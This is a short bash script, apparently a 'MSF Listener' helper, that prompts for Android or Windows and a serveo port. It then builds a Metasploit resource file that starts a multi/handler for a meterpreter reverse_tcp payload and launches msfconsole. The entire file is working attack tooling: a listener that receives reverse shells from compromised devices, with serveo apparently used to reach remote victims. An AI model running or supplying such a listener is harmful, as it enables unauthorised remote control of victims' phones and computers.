#!/bin/bash

printf "\e[31;1m_  _ ____ ____ \e[0m\e[34;1m_    _ ____ ___ ____ _  _ ____ ____ \e[0m\n"
printf "\e[31;1m|\/| [__  |___\e[0m\e[34;1m |    | [__   |  |___ |\ | |___ |__/\e[0m\n"
printf "\e[31;1m|  | ___] |    \e[0m\e[34;1m|___ | ___]  |  |___ | \| |___ |  \ \e[0m\n"
printf "\n"
printf "\e[31;1m[§] Android\e[0m\n"
printf "\e[31;1m[§] Windows\e[0m\n"
read -p "Select platform(1/2): " platform
read -p "Enter serveo port: " port

if [ $platform == 1 ]; then
echo "use exploit/multi/handler" > handler.rc
echo "set payload android/meterpreter/reverse_tcp" >> handler.rc
echo "set lhost localhost" >> handler.rc
echo "set lport $port" >> handler.rc
echo "exploit" >> handler.rc
msfconsole -r handler.rc
rm handler.rc
fi

if [ $platform == 2 ]; then
echo "use exploit/multi/handler" > handler.rc
echo "set payload windows/meterpreter/reverse_tcp" >> handler.rc
echo "set lhost localhost" >> handler.rc
echo "set lport $port" >> handler.rc
echo "exploit" >> handler.rc
msfconsole -r handler.rc
rm handler.rc
fi

